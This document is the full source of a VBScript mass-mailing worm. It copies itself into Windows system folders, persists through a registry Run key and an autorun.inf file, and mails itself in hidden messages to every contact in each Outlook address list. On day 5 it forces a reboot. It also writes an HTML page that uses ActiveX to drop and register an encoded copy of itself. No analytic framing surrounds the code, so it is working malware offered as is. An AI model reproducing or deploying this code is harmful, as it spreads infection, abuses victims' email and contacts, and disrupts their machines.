On Error Resume Next
Randomize
Dim shell, fso, daNet
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set daNet = CreateObject("WScript.Network")
sDir1 = fso.BuildPath(fso.GetSpecialFolder(0), "OOBHCDGC.VBS")
fso.CopyFile WScript.ScriptFullName, sDir1
sDir2 = fso.BuildPath(fso.GetSpecialFolder(1), "CAIXDVRP.VBS")
fso.CopyFile WScript.ScriptFullName, sDir2
sDir3 = fso.BuildPath(fso.GetSpecialFolder(2), "BPDNQLVR.VBS")
fso.CopyFile WScript.ScriptFullName, sDir3
sRun = "\Software\Microsoft\Windows\CurrentVersion\Run"
shell.RegWrite "HKCU" & sRun & "\Windows Cursor", "%WINDIR%\wscript.exe " & sDir1, "REG_EXPAND_SZ"
Set Script = fso.CreateTextFile("c:\autorun.inf", True)
Script.WriteLine("[autorun]")
Script.WriteLine("open=" & sDir1)
Script.Close
Set OutApp = CreateObject("Outlook.Application")
Set MapiName = OutApp.GetNameSpace("MAPI")
For Each Addr In MapiName.AddressLists
  If Addr.AddressEntries.Count > 0 Then
    Set NewMail = OutApp.CreateItem(0)
    For IDX = 1 To Addr.AddressEntries.Count
      Set AddrEntry = Addr.AddressEntries(IDX)
        If IDX = 1 Then
          NewMail.BCC = AddrEntry.Address
        Else
          NewMail.BCC = NewMail.BCC & "; " & AddrEntry.Address
        End If
    Next
    NewMail.Subject = "insert subject here"
    NewMail.Body = "insert body here" & vbCRLF
    NewMail.Attachments.Add WScript.ScriptFullName
    NewMail.DeleteAfterSubmit = True
    NewMail.Send
  End If
Next
If Day = 5 Then
  shell.Run ("rundll32.exe shell32.dll, SHExitWindowsEx 4")
  shell.Run ("SHUTDOWN ~R ~T:1")
End If
part1="^!DOCTYPE HTML PUBLIC @@-~~W3C~~DTD HTML 3.2 Final~~EN@@>"&vbCRLF& _
"^html>^head>^script language=@@JScript@@>"&vbCRLF& _
"^!--~~"&vbCRLF& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbCRLF& _
"~~-->"&vbCRLF& _
"^~script>^script language=@@VBScript@@>"&vbCRLF& _
"^!--"&vbCRLF& _
"sub window_onload()"&vbCRLF& _
"on error resume next"&vbCRLF& _
""&vbCRLF& _
"dookie="
part2="set fso=CreateObject(@@Scripting.FileSystemObject@@)"&vbCRLF& _
"set windir=fso.GetSpecialFolder(0)"&vbCRLF& _
"shit=replace(dookie,chr(124),chr(34))"&vbCRLF& _
"set wri=fso.CreateTextFile(windir&@@\syscheck.vbs@@)"&vbCRLF& _
"wri.write shit"&vbCRLF& _
"wri.close"&vbCRLF& _
"Set shell=CreateObject(@@WScript.Shell@@)"&vbCRLF& _
"shell.RegWrite @@HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Windows Check@@,windir&@@\syscheck.vbs@@"&vbCRLF& _
""&vbCRLF& _
"End Sub"&vbCRLF& _
"~~-->"&vbCRLF& _
"^~script>"&vbCRLF& _
"^title>Rules from the Hell^~title>^~head>^body bgcolor=@@White@@>"&vbCRLF& _
"^center>^p>^br>^br>^font size=@@+2@@>^font color=@@Hell@@>Rules from the Hell"&vbCRLF& _
"^~font>^~font>^p>^hr color=@@Purple@@>^p>Error while loading page^^br>^p>^strong>"&vbCRLF& _
"^font size=@@+1@@ color=@@Red@@>Please enabled ActiveX to view this page^~font>"&vbCRLF& _
"^~strong>^~center>^~body>^~html>"
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbCRLF)
l1=ubound(lines)
for n=0 to ubound(lines)
  lines(n)=replace(lines(n),chr(34),chr(124))
  lines(n)=replace(lines(n),chr(47),chr(126))
  lines(n)=replace(lines(n),chr(60),chr(94))
  if (l1=n) then
    lines(n)=chr(34)+lines(n)+chr(34)
  else
    lines(n)=chr(34)+lines(n)+chr(34)&"&vbCRLF& _"
  end if
next
part1=replace(part1,chr(64)&chr(64),chr(34))
part1=replace(part1,chr(126),chr(47))
part1=replace(part1,chr(94),chr(60))
part2=replace(part2,chr(64)&chr(64),chr(34))
part2=replace(part2,chr(126),chr(47))
part2=replace(part2,chr(94),chr(60))
set d=fso.CreateTextFile(fso.BuildPath(fso.GetSpecialFolder(0),"hell.htm"))
d.write part1
d.write join(lines,vbCRLF)
d.write vbCRLF & part2
d.close

